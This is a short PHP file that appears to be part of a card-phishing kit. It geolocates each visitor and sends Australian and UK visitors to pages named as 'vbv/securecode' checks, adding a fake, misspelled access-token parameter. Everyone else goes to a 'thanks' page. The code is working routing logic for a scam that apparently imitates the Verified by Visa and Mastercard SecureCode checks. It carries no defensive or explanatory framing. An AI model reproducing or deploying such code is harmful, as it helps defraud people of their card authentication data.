<?php

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
// create a variable for the country code
$var_country_code = $geoplugin->countryCode;
// vbv/securecode redirect based on country code:
if ($var_country_code == "AU") {
header('Location: securau.php?Go=_secure_res&_Acess_Tooken=d2b1a896a29a6af53a2f0d23f0c705e2ee17233d');
}
else if ($var_country_code == "UK") {
header('Location: securuk.php?Go=_secure_res&_Acess_Tooken=d2b1a896a29a6af53a2f0d23f0c705e2ee17233d');
}
else {
header('Location: rthanks.php');
}
?>